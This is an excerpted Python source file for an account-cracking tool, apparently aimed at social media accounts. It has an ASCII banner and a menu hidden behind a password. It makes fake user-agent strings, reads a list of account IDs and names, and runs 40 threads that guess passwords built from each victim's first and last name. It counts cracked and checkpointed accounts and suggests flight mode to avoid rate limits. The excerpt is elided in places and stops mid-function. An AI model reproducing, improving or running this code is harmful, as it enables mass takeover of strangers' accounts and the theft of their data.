...
██║         ╚██████╗███████╗╚██████╔╝██║ ╚████║███████╗
╚═╝          ╚═════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{ENDC}
{CYAN}Author     : {OKGREEN}Anon_Girl
{CYAN}Version    : {OKGREEN}1.0{ENDC}
"""
def logo():
        print(banner)
...
for xd in range(10):
        ...
        uag=f'{aa} {ver}; {b} build/{c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uag)
        
uugg = open('.ug1.txt', 'r').read().splitlines()

def linex():
    print(f"{CYAN}•{ENDC}"*90)
def clear():
    os.system("clear")
def menu():
        try:
                ...
                if x == ("sex"):
                        logo()
                        print(f'{WARNING}[1]•File cloning\n')
                        linex()
                        xd=input(f'{ENDC}{bold}Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                ...
                                with tred(max_workers=40) as crack_submit:
                                        ...
                                        print('Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist1 =["first last","firstlast","first","last","firstfirst","lastlast"]
                                                passlist2=["FirstLast","First Last","First","Last","FirstFirst","LastLast"]
                                                passlist3=["first123","first1234","last123","last1234","firstlast123","firstlast1234","firstlast12345"]
                                                passlist4=["First123","First1234","Last123","Last1234","FirstLast123","FirstLast1234","FirstLast12345"]
                                                passlist5=["firstfirst123","firstfirst1234","lastlast123","lastlast1234","FirstFirst123","LastLast1234"]
                                                
                                                crack_submit.submit(rndm,ids,names,passlist1)
                                                crack_submit.submit(rndm,ids,names,passlist2)
                                                crack_submit.submit(rndm,ids,names,passlist3)
                                                crack_submit.submit(rndm,ids,names,passlist4)
                                                crack_submit.submit(rndm,ids,names,passlist5)
...
def rndm(ids,names,passlist):
                try:
                        global loop,oks,cps
                        sys.stdout.write(f"\r\r\033[1;{str(random.randrange(30,39))}m [•] (Cracking) - %s \033[1;32mOK-%s \033[1;33mCP-%s\033[1;97m"%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
